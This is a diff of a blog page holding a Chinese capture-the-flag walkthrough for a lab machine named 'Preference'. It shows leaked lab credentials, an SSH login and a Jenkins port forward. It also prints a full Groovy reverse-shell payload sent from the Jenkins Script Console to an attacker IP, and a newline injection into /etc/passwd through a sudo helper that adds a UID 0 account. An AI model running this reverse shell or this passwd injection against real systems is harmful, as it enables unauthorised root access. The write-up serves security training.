+<div class="highlight highlight-source-json"><pre class="notranslate">{<span class="pl-ent">"api_key"</span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_974818108609<span class="pl-pds">"</span></span>,<span class="pl-ent">"backup_codes"</span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>344818<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>988944<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>873105<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>266046<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-ent">"department"</span>:<span class="pl-s"><span class="pl-pds">"</span>信息技术部<span class="pl-pds">"</span></span>,<span class="pl-ent">"display_name"</span>:<span class="pl-s"><span class="pl-pds">"</span>Lin Hao<span class="pl-pds">"</span></span>,<span class="pl-ent">"email"</span>:<span class="pl-s"><span class="pl-pds">"</span>linhao8038@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-ent">"has_secret"</span>:<span class="pl-c1">true</span>,<span class="pl-ent">"password_hash"</span>:<span class="pl-s"><span class="pl-pds">"</span>$2b$12$7096212241602057<span class="pl-pds">"</span></span>,<span class="pl-ent">"phone"</span>:<span class="pl-s"><span class="pl-pds">"</span>13853496395<span class="pl-pds">"</span></span>,<span class="pl-ent">"private_notes"</span>:<span class="pl-s"><span class="pl-pds">"</span>Jenkins 管理员密码: Jenkins8038#Admin<span class="pl-pds">"</span></span>,<span class="pl-ent">"role"</span>:<span class="pl-s"><span class="pl-pds">"</span>administrator<span class="pl-pds">"</span></span>,<span class="pl-ent">"sso_token"</span>:<span class="pl-s"><span class="pl-pds">"</span>sso_administrator_8038_725761<span class="pl-pds">"</span></span>,<span class="pl-ent">"status"</span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-ent">"uid"</span>:<span class="pl-c1">8038</span>,<span class="pl-ent">"username"</span>:<span class="pl-s"><span class="pl-pds">"</span>linhao8038<span class="pl-pds">"</span></span>,<span class="pl-ent">"vpn_access"</span>:<span class="pl-c1">true</span>}</pre></div>
 <h4>3. 数据库连接串</h4>
-<pre lang="text"><code>mysql://admin:DbP4ss1335@db1335.internal:3306
+<pre lang="text" class="notranslate"><code class="notranslate">mysql://admin:DbP4ss1335@db1335.internal:3306
 mysql://admin:DbP4ss5219@db5219.internal:3306
 </code></pre>
 <h4>4. API 网关后台地址和 token</h4>
-<pre lang="text"><code>https://admin.internal.1226.corp/token=726302371
+<pre lang="text" class="notranslate"><code class="notranslate">https://admin.internal.1226.corp/token=726302371
 https://admin.internal.1818.corp/token=239851954
 </code></pre>
 <h4>5. 企业微信 webhook</h4>
-<pre lang="text"><code>https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=321456147
+<pre lang="text" class="notranslate"><code class="notranslate">https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=321456147
 https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=385237898
 </code></pre>
 <h4>6. VPN 配置文件路径</h4>
-<pre lang="text"><code>/etc/openvpn/client1595.ovpn
+<pre lang="text" class="notranslate"><code class="notranslate">/etc/openvpn/client1595.ovpn
 /etc/openvpn/client9409.ovpn
 /etc/openvpn/client9944.ovpn
 </code></pre>
 <h4>7. 其他内部令牌和恢复信息</h4>
 <p>每个敏感用户还泄露了：</p>
-<pre lang="text"><code>api_key
+<pre lang="text" class="notranslate"><code class="notranslate">api_key
 backup_codes
 sso_token
 password_hash
 vpn_access
 </code></pre>
 <p>从利用角度来说，最直接的落地点有两个：</p>
-<pre lang="text"><code>1. SSH 明文密码
+<pre lang="text" class="notranslate"><code class="notranslate">1. SSH 明文密码
 2. Jenkins 管理员密码
 </code></pre>
 <p>这两个就足够完成整条攻击链了。</p>
-<hr />
+<hr>
 <h2>SSH 初始立足</h2>
 <p>直接用泄露到的 SSH 密码登录：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ssh gaoyan8764@192.168.205.217
-gaoyan8764@192.168.205.217's password:
-</code></pre>
+gaoyan8764@192.168.205.217<span class="pl-s"><span class="pl-pds">'</span>s password:</span></pre></div>
 <p>输入：</p>
-<pre lang="text"><code>R00t8764!Pass
+<pre lang="text" class="notranslate"><code class="notranslate">R00t8764!Pass
 </code></pre>
 <p>登录成功：</p>
-<pre lang="bash"><code>              _
-__      _____| | ___ ___  _ __ ___   ___
-\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
- \ V  V /  __/ | (_| (_) | | | | | |  __/
-  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
-
-gaoyan8764@Preference:~$ id
-uid=1000(gaoyan8764) gid=1000(gaoyan8764) groups=1000(gaoyan8764)
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">              _
+__      _____<span class="pl-k">|</span> <span class="pl-k">|</span> ___ ___  _ __ ___   ___
+<span class="pl-cce">\ \ </span>/<span class="pl-cce">\ </span>/ / _ <span class="pl-cce">\ </span><span class="pl-k">|</span>/ __/ _ <span class="pl-cce">\|</span> <span class="pl-s"><span class="pl-pds">'</span>_ ` _ \ / _ \</span>
+<span class="pl-s"> \ V  V /  __/ | (_| (_) | | | | | |  __/</span>
+<span class="pl-s">  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|</span>
+<span class="pl-s"></span>
+<span class="pl-s">gaoyan8764@Preference:~$ id</span>
+<span class="pl-s">uid=1000(gaoyan8764) gid=1000(gaoyan8764) groups=1000(gaoyan8764)</span></pre></div>
 <p>读取 user flag：</p>
-<pre lang="bash"><code>gaoyan8764@Preference:~$ cat /home/gaoyan8764/user.txt
-flag{user-6380a935b0dc8e88865aba0c0524b9b5}
-</code></pre>
-<hr />
+<div class="highlight highlight-source-shell"><pre class="notranslate">gaoyan8764@Preference:<span class="pl-k">~</span>$ cat /home/gaoyan8764/user.txt
+flag{user-6380a935b0dc8e88865aba0c0524b9b5}</pre></div>
+<hr>
 <h2>进入系统后的信息收集</h2>
 <p>先看 sudo 权限：</p>
-<pre lang="bash"><code>gaoyan8764@Preference:/home$ sudo -l
-[sudo] password for gaoyan8764:
-Sorry, user gaoyan8764 may not run sudo on Preference.
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">gaoyan8764@Preference:/home$ sudo -l
+[sudo] password <span class="pl-k">for</span> gaoyan8764:
+Sorry, user gaoyan8764 may not run sudo on Preference.</pre></div>
 <p>没有 sudo。</p>
 <p>看系统用户：</p>
-<pre lang="bash"><code>gaoyan8764@Preference:/home$ cat /etc/passwd
+<div class="highlight highlight-source-shell"><pre class="notranslate">gaoyan8764@Preference:/home$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
@@ -837,13 +824,12 @@ nobody:x:65534:65534:nobody:/:/sbin/nologin
 klogd:x:100:101:klogd:/dev/null:/sbin/nologin
 apache:x:104:106:apache:/var/www:/sbin/nologin
 gaoyan8764:x:1000:1000::/home/gaoyan8764:/bin/bash
-jenkins:x:1001:1001::/var/lib/jenkins:/bin/bash
-</code></pre>
+jenkins:x:1001:1001::/var/lib/jenkins:/bin/bash</pre></div>
 <p>这里有一个很显眼的本地用户：</p>
-<pre lang="text"><code>jenkins
+<pre lang="text" class="notranslate"><code class="notranslate">jenkins
 </code></pre>
 <p>再看进程：</p>
-<pre lang="bash"><code>gaoyan8764@Preference:/tmp$ ps -ef
+<div class="highlight highlight-source-shell"><pre class="notranslate">gaoyan8764@Preference:/tmp$ ps -ef
 PID   USER     TIME  COMMAND
 1 root      0:00 /sbin/init
 2400 root      0:00 /sbin/udhcpc -b -R -p /var/run/udhcpc.eth0.pid -i eth0 -x hostname:Preference
@@ -852,28 +838,26 @@ PID   USER     TIME  COMMAND
 2538 root      0:00 /usr/sbin/crond -c /etc/crontabs -f
 2564 root      3:48 /usr/bin/python3 /opt/gateway/app.py
 2590 jenkins   0:10 /usr/bin/java -Djava.awt.headless=true -jar /var/lib/jenkins/jenkins.war --httpPort=8080 --httpListenAddress=127.0.0.1 --webroot=/var/lib/jenkins/.jenkins/war
-2616 ntp       0:00 /usr/sbin/ntpd -N -p pool.ntp.org -n
-</code></pre>
+2616 ntp       0:00 /usr/sbin/ntpd -N -p pool.ntp.org -n</pre></div>
 <p>这里可以明确确认：</p>
-<pre lang="text"><code>Jenkins 正在运行
+<pre lang="text" class="notranslate"><code class="notranslate">Jenkins 正在运行
 端口绑定在 127.0.0.1:8080
 </code></pre>
 <p>也就是说，外部 nmap 扫不到 8080，但在本机内部是能访问到的。</p>
-<hr />
+<hr>
 <h2>Jenkins 横向</h2>
 <p>前面在敏感信息泄露里已经拿到了 3 组 Jenkins 管理员密码：</p>
-<pre lang="text"><code>Jenkins6530#Admin
+<pre lang="text" class="notranslate"><code class="notranslate">Jenkins6530#Admin
 Jenkins7920#Admin
 Jenkins8038#Admin
 </code></pre>
-<p>而本地又明确存在 <code>jenkins</code> 用户和 Jenkins 进程，所以这条线必须继续跟。</p>
+<p>而本地又明确存在 <code class="notranslate">jenkins</code> 用户和 Jenkins 进程，所以这条线必须继续跟。</p>
 <p>先做本地转发，把靶机上的 127.0.0.1:8080 转到 Kali 本地：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ ssh -L 8088:127.0.0.1:8080 gaoyan8764@192.168.205.217
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh -L 8088:127.0.0.1:8080 gaoyan8764@192.168.205.217</pre></div>
 <p>保持这个 SSH 会话不要关，再在 Kali 新开一个终端确认 Jenkins 可访问：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl -si http://127.0.0.1:8088/login | head
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -si http://127.0.0.1:8088/login <span class="pl-k">|</span> head
 HTTP/1.1 200 OK
 Date: Tue, 10 Jun 2026 00:11:59 GMT
 X-Content-Type-Options: nosniff
@@ -881,95 +865,84 @@ X-Hudson: 1.395
 X-Jenkins: 2.535
 X-Jenkins-Session: 34fd41f5
 X-Frame-Options: sameorigin
-Content-Type: text/html;charset=UTF-8
-</code></pre>
+Content-Type: text/html<span class="pl-k">;</span>charset=UTF-8</pre></div>
 <p>说明本地转发成功。</p>
 <p>然后浏览器访问：</p>
-<pre lang="text"><code>http://127.0.0.1:8088
+<pre lang="text" class="notranslate"><code class="notranslate">http://127.0.0.1:8088
 </code></pre>
 <p>尝试登录，最终有效凭据是：</p>
-<pre lang="text"><code>用户名: jenkins
+<pre lang="text" class="notranslate"><code class="notranslate">用户名: jenkins
 密码: Jenkins6530#Admin
 </code></pre>
 <p>成功进入 Jenkins 后，来到：</p>
-<pre lang="text"><code>Manage Jenkins -&gt; Script Console
+<pre lang="text" class="notranslate"><code class="notranslate">Manage Jenkins -&gt; Script Console
 </code></pre>
 <p>这个功能非常关键，因为它允许管理员直接执行 Groovy 代码。</p>
-<hr />
+<hr>
 <h2>Jenkins Script Console 拿 shell</h2>
 <p>先验证一下能不能执行命令：</p>
-<pre lang="groovy"><code>println([&quot;bash&quot;,&quot;-c&quot;,&quot;id&quot;].execute().text)
-</code></pre>
+<div class="highlight highlight-source-groovy"><pre class="notranslate"><span class="pl-c1">println</span>([<span class="pl-s"><span class="pl-pds">"</span>bash<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>-c<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>]<span class="pl-k">.</span>execute()<span class="pl-k">.</span>text)</pre></div>
 <p>返回：</p>
-<pre lang="text"><code>uid=1001(jenkins) gid=1001(jenkins) groups=1001(jenkins),82(www-data)
+<pre lang="text" class="notranslate"><code class="notranslate">uid=1001(jenkins) gid=1001(jenkins) groups=1001(jenkins),82(www-data)
 </code></pre>
-<p>说明已经可以以 <code>jenkins</code> 用户执行系统命令。</p>
+<p>说明已经可以以 <code class="notranslate">jenkins</code> 用户执行系统命令。</p>
 <p>接下来直接反弹一个 shell 到 Kali。</p>
 <p>Kali 先监听：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ nc -lvnp 8888
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888</pre></div>
 <p>然后在 Script Console 里执行：</p>
-<pre lang="groovy"><code>String host=&quot;192.168.205.128&quot;;int port=8888;String cmd=&quot;/bin/sh&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
-</code></pre>
+<div class="highlight highlight-source-groovy"><pre class="notranslate"><span class="pl-k">String</span> host<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>192.168.205.128<span class="pl-pds">"</span></span>;<span class="pl-k">int</span> port<span class="pl-k">=</span><span class="pl-c1">8888</span>;<span class="pl-k">String</span> cmd<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>/bin/sh<span class="pl-pds">"</span></span>;<span class="pl-k">Process</span> p<span class="pl-k">=</span><span class="pl-k">new</span> <span class="pl-k">ProcessBuilder</span>(cmd)<span class="pl-k">.</span>redirectErrorStream(<span class="pl-c1">true</span>)<span class="pl-k">.</span>start();<span class="pl-k">Socket</span> s<span class="pl-k">=</span><span class="pl-k">new</span> <span class="pl-k">Socket</span>(host,port);<span class="pl-k">InputStream</span> pi<span class="pl-k">=</span>p<span class="pl-k">.</span>getInputStream(),pe<span class="pl-k">=</span>p<span class="pl-k">.</span>getErrorStream(),si<span class="pl-k">=</span>s<span class="pl-k">.</span>getInputStream();<span class="pl-k">OutputStream</span> po<span class="pl-k">=</span>p<span class="pl-k">.</span>getOutputStream(),so<span class="pl-k">=</span>s<span class="pl-k">.</span>getOutputStream();<span class="pl-k">while</span>(<span class="pl-k">!</span>s<span class="pl-k">.</span>isClosed()){<span class="pl-k">while</span>(pi<span class="pl-k">.</span>available()<span class="pl-k">&gt;</span><span class="pl-c1">0</span>)so<span class="pl-k">.</span>write(pi<span class="pl-k">.</span>read());<span class="pl-k">while</span>(pe<span class="pl-k">.</span>available()<span class="pl-k">&gt;</span><span class="pl-c1">0</span>)so<span class="pl-k">.</span>write(pe<span class="pl-k">.</span>read());<span class="pl-k">while</span>(si<span class="pl-k">.</span>available()<span class="pl-k">&gt;</span><span class="pl-c1">0</span>)po<span class="pl-k">.</span>write(si<span class="pl-k">.</span>read());so<span class="pl-k">.</span>flush();po<span class="pl-k">.</span>flush();<span class="pl-k">Thread</span><span class="pl-k">.</span>sleep(<span class="pl-c1">50</span>);<span class="pl-k">try</span>{p<span class="pl-k">.</span>exitValue();<span class="pl-k">break</span>;}<span class="pl-k">catch</span>(<span class="pl-k">Exception</span> e){}};p<span class="pl-k">.</span>destroy();s<span class="pl-k">.</span>close();</pre></div>
 <p>监听端收到连接后，确认身份：</p>
-<pre lang="bash"><code>Preference:/$ id
-uid=1001(jenkins) gid=1001(jenkins) groups=82(www-data),1001(jenkins)
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/$ id
+uid=1001(jenkins) gid=1001(jenkins) groups=82(www-data),1001(jenkins)</pre></div>
 <p>现在就完成了：</p>
-<pre lang="text"><code>gaoyan8764 -&gt; Jenkins 管理员 -&gt; jenkins 用户 shell
+<pre lang="text" class="notranslate"><code class="notranslate">gaoyan8764 -&gt; Jenkins 管理员 -&gt; jenkins 用户 shell
 </code></pre>
-<hr />
+<hr>
 <h2>Jenkins 用户提权</h2>
-<p>先看 <code>jenkins</code> 的 sudo：</p>
-<pre lang="bash"><code>Preference:/$ sudo -l
-Matching Defaults entries for jenkins on Preference:
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+<p>先看 <code class="notranslate">jenkins</code> 的 sudo：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> jenkins on Preference:
+    secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
 
-Runas and Command-specific defaults for jenkins:
-    Defaults!/usr/sbin/visudo env_keep+=&quot;SUDO_EDITOR EDITOR VISUAL&quot;
+Runas and Command-specific defaults <span class="pl-k">for</span> jenkins:
+    Defaults<span class="pl-k">!</span>/usr/sbin/visudo env_keep+=<span class="pl-s"><span class="pl-pds">"</span>SUDO_EDITOR EDITOR VISUAL<span class="pl-pds">"</span></span>
 
 User jenkins may run the following commands on Preference:
-    (ALL) NOPASSWD: /usr/local/bin/edit_passwd
-</code></pre>
+    (ALL) NOPASSWD: /usr/local/bin/edit_passwd</pre></div>
 <p>这里直接给出了提权入口：</p>
-<pre lang="text"><code>jenkins 可以无密码 sudo 执行 /usr/local/bin/edit_passwd
+<pre lang="text" class="notranslate"><code class="notranslate">jenkins 可以无密码 sudo 执行 /usr/local/bin/edit_passwd
 </code></pre>
-<p>先看当前 <code>/etc/passwd</code> 里 jenkins 的记录：</p>
-<pre lang="bash"><code>Preference:/$ grep jenkins /etc/passwd
-jenkins:x:1001:1001::/var/lib/jenkins:/bin/bash
-</code></pre>
+<p>先看当前 <code class="notranslate">/etc/passwd</code> 里 jenkins 的记录：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/$ grep jenkins /etc/passwd
+jenkins:x:1001:1001::/var/lib/jenkins:/bin/bash</pre></div>
 <p>测试一下这个脚本到底做什么：</p>
-<pre lang="bash"><code>Preference:/$ sudo /usr/local/bin/edit_passwd jenkins &quot;aaa&quot;
-Editing GECOS field for user: jenkins (UID: 1001)
-Successfully updated GECOS field for user: jenkins
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/$ sudo /usr/local/bin/edit_passwd jenkins <span class="pl-s"><span class="pl-pds">"</span>aaa<span class="pl-pds">"</span></span>
+Editing GECOS field <span class="pl-k">for</span> user: jenkins (UID: 1001)
+Successfully updated GECOS field <span class="pl-k">for</span> user: jenkins</pre></div>
 <p>再看 passwd：</p>
-<pre lang="bash"><code>Preference:/$ grep jenkins /etc/passwd
-jenkins:x:1001:1001:aaa:/var/lib/jenkins:/bin/bash
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/$ grep jenkins /etc/passwd
+jenkins:x:1001:1001:aaa:/var/lib/jenkins:/bin/bash</pre></div>
 <p>说明：</p>
-<pre lang="text"><code>这个脚本会修改指定用户在 /etc/passwd 中的 GECOS 字段
+<pre lang="text" class="notranslate"><code class="notranslate">这个脚本会修改指定用户在 /etc/passwd 中的 GECOS 字段
 </code></pre>
 <p>也就是第 5 字段。</p>
 <p>接下来测试它是否过滤特殊字符。先试冒号：</p>
-<pre lang="bash"><code>Preference:/$ sudo /usr/local/bin/edit_passwd jenkins &quot;x:0:0:pwn:/root:/bin/sh&quot;
-Editing GECOS field for user: jenkins (UID: 1001)
-Successfully updated GECOS field for user: jenkins
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/$ sudo /usr/local/bin/edit_passwd jenkins <span class="pl-s"><span class="pl-pds">"</span>x:0:0:pwn:/root:/bin/sh<span class="pl-pds">"</span></span>
+Editing GECOS field <span class="pl-k">for</span> user: jenkins (UID: 1001)
+Successfully updated GECOS field <span class="pl-k">for</span> user: jenkins</pre></div>
 <p>结果：</p>
-<pre lang="bash"><code>Preference:/$ grep jenkins /etc/passwd
-jenkins:x:1001:1001:x:0:0:pwn:/root:/bin/sh:/var/lib/jenkins:/bin/bash
-</code></pre>
-<p>说明输入内容被原样写进了 <code>/etc/passwd</code>，没有做任何过滤。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/$ grep jenkins /etc/passwd
+jenkins:x:1001:1001:x:0:0:pwn:/root:/bin/sh:/var/lib/jenkins:/bin/bash</pre></div>
+<p>说明输入内容被原样写进了 <code class="notranslate">/etc/passwd</code>，没有做任何过滤。</p>
 <p>那就可以继续尝试更危险的换行注入。</p>
-<hr />
+<hr>
 <h2>/etc/passwd 换行注入</h2>
-<p>一开始可以试最简单的换行插入一个 UID 0 账号，但空密码账号不一定总能稳定 <code>su</code> 成功，受 PAM 配置影响比较大。所以更稳的做法是：</p>
-<pre lang="text"><code>直接插入一个带已知密码哈希的 UID 0 root 用户
+<p>一开始可以试最简单的换行插入一个 UID 0 账号，但空密码账号不一定总能稳定 <code class="notranslate">su</code> 成功，受 PAM 配置影响比较大。所以更稳的做法是：</p>
+<pre lang="text" class="notranslate"><code class="notranslate">直接插入一个带已知密码哈希的 UID 0 root 用户
 </code></pre>
 <p>这里构造的新用户信息：</p>
-<pre lang="text"><code>用户名: b
+<pre lang="text" class="notranslate"><code class="notranslate">用户名: b
 密码哈希: $1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0
 UID: 0
 GID: 0
@@ -977,18 +950,17 @@ HOME: /root
 SHELL: /bin/bash
 </code></pre>
 <p>执行注入：</p>
-<pre lang="bash"><code>Preference:/$ sudo /usr/local/bin/edit_passwd jenkins $':/var/lib/jenkins:/bin/bash\nb:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash\n#'
-Editing GECOS field for user: jenkins (UID: 1001)
-Successfully updated GECOS field for user: jenkins
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/$ sudo /usr/local/bin/edit_passwd jenkins <span class="pl-s"><span class="pl-pds">$'</span>:/var/lib/jenkins:/bin/bash<span class="pl-cce">\n</span>b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash<span class="pl-cce">\n</span>#<span class="pl-pds">'</span></span>
+Editing GECOS field <span class="pl-k">for</span> user: jenkins (UID: 1001)
+Successfully updated GECOS field <span class="pl-k">for</span> user: jenkins</pre></div>
 <p>这里传进去的是一个多行字符串，效果是：</p>
 <ol>
 <li>先把原 jenkins 行进行恢复，防止等会彻底死掉</li>
-<li>中间插入一整行新的 root 用户 <code>b</code></li>
+<li>中间插入一整行新的 root 用户 <code class="notranslate">b</code></li>
 <li>再将原本的 jenkins 后半部分进行注释</li>
 </ol>
-<p>注入之后看 <code>/etc/passwd</code>：</p>
-<pre lang="bash"><code>Preference:/$ cat /etc/passwd
+<p>注入之后看 <code class="notranslate">/etc/passwd</code>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
@@ -1010,33 +982,28 @@ klogd:x:100:101:klogd:/dev/null:/sbin/nologin
 apache:x:104:106:apache:/var/www:/sbin/nologin
 gaoyan8764:x:1000:1000::/home/gaoyan8764:/bin/bash
 jenkins:x:1001:1001::/var/lib/jenkins:/bin/bash
-b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash
-#:/var/lib/jenkins:/bin/bash
-</code></pre>
-<p>可以看到，账号 <code>b</code> 已经被成功插进去，而且是：</p>
-<pre lang="text"><code>UID 0
+b:<span class="pl-smi">$1</span><span class="pl-smi">$AydoDDh4$tEky6m30</span>.0nY3HZ8FgoGI0:0:0::/root:/bin/bash
+<span class="pl-c"><span class="pl-c">#</span>:/var/lib/jenkins:/bin/bash</span></pre></div>
+<p>可以看到，账号 <code class="notranslate">b</code> 已经被成功插进去，而且是：</p>
+<pre lang="text" class="notranslate"><code class="notranslate">UID 0
 GID 0
 shell /bin/bash
 </code></pre>
 <p>这就已经足够了。</p>
-<hr />
+<hr>
 <h2>切换 root</h2>
 <p>直接切换用户：</p>
-<pre lang="bash"><code>Preference:/$ su b
-Password:abcdefg
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/$ su b
+Password:abcdefg</pre></div>
 <p>输入与该哈希对应的密码后，成功拿到 root：</p>
-<pre lang="bash"><code>Preference:/# id
-uid=0(root) gid=0(root) groups=0(root)
-</code></pre>
-<hr />
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/<span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+<hr>
 <h2>读取 flag</h2>
 <p>最后读取 user 和 root flag：</p>
-<pre lang="bash"><code>Preference:/# cat /root/root.txt /home/gaoyan8764/user.txt
+<div class="highlight highlight-source-shell"><pre class="notranslate">Preference:/<span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt /home/gaoyan8764/user.txt</span>
 flag{root-f528c6318cb57c8f56f8b9ebf9a10b56}
-flag{user-6380a935b0dc8e88865aba0c0524b9b5}
-</code></pre>
-</div>
+flag{user-6380a935b0dc8e88865aba0c0524b9b5}</pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -1061,7 +1028,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
